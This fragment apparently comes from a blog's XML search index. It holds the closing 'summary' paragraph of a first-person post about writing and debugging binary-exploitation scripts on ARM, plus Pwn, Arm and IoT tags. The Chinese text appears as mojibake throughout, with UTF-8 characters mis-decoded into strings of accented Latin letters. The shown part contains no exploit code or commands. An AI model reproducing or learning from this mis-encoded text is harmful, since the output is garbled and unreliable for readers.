title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢å•¦ï¼Œæœ‰å†™çš„æœ‰é—®é¢˜çš„åœ°æ–¹è¿˜æœ›å„ä½å¸ˆå‚…æ–§æ­£ã€‚ä¸Šé¢çš„æ“ä½œåŸºæœ¬å¯ä»¥å®ç°åœ¨armæ¶æ„ä¸‹çš„è„šæœ¬å†™expå¹¶è°ƒè¯•ï¼Œå¦‚æœè§‰å¾—è‡ªå¸¦çš„vimä¸å¤Ÿæ–¹ä¾¿çš„è¯è¿˜å¯ä»¥ä½¿ç”¨è¿œç¨‹ç¼–è¾‘expï¼Œè¿™ä¸ªä¼šåœ¨æ—¥åæ›´æ–°çš„ã€‚è¿™é‡Œæ˜¯æœ¬äººçš„ä¸€ç‚¹æ‹™è§ï¼Œå¸Œæœ›æˆ‘å†™çš„ä¸œè¥¿èƒ½å¯¹ä½ æœ‰ä¸€ä¸ä¸çš„å¸®åŠ©ï¼Œæ„Ÿè°¢æ¯ä¸ªè§‚çœ‹è¯¥æ–‡ç« çš„å¸ˆå‚…ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Armpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Arm </tag>
            
            <tag> Iot </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
